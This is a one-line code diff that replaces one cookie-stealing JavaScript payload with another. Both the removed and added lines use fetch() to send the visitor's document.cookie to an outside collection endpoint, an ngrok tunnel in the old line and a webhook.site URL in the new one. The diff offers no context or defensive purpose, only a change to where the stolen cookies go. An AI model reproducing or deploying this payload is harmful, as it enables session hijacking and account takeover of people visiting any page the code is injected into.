@@ -1,1 +1,1 @@
-fetch('https://099f-149-50-216-249.ngrok-free.app?c=' + document.cookie);
+fetch('https://webhook.site/7e0be89d-d632-4507-a4f2-5d3ef6112002?c=' + document.cookie);
